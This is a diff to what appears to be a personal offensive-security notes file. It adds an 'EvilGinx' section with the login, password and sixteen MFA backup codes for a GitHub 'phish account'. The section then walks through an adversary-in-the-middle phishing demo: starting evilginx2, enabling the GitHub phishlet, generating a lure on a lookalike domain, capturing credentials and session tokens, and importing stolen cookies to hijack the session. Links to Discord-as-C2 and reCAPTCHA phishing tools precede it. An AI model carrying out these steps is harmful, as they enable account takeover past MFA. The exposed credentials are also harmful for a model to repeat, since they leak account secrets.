@@ -2,3 +2,45 @@
 	- https://infosecwriteups.com/using-discord-as-a-c2-cf90b3480689
 - # [Recaptcha Phish](https://github.com/JohnHammond/recaptcha-phish) 
 	- https://github.com/JohnHammond/recaptcha-phish
+- 
+- # EvilGinx
+	- github phish account
+		- b7h30@proton.me / PhishBaitPwn
+		- YourComputerIsMyOtherComputer
+		-  backup codes
+			- 00e91-d573f
+			- 27907-dc1f0
+			- 36f8e-df44f
+			- c24f9-87739
+			- 55bfe-9f4d7
+			- a11c3-fae19
+			- 22db8-536a6
+			- 2df38-feceb
+			- 29eb1-eac0f
+			- 58642-a6380
+			- 08645-1e88f
+			- 09adb-e58a3
+			- f44c6-a205b
+			- cd467-95ed4
+			- 2fe9e-c9015
+			- 862ce-e2f75
+	- # Demo
+	- start evilginx `evilginx2 -p phishlets`
+	- enable github phishlet `phishlets enable github`
+	- create lure `lures create github`
+	- get lure url `lures get-url 0`
+		- https://login-github.org/yoaydmQM
+	- navigate to url 
+	- input creds PhishBaitPwn / YourComputerIsMyOtherComputer
+	- Input MFA
+	- logged in under my domain interacting with github
+	- check evilginx for creds and tokens
+	- sessions
+		- sessions no.
+	- close lure url tab
+	- Delete browsing data
+	- copy cookie data from [{ cookie }]
+	- open editthiscookie extension
+		- import and paste cookie 
+			- check mark
+	- browse to github.com-
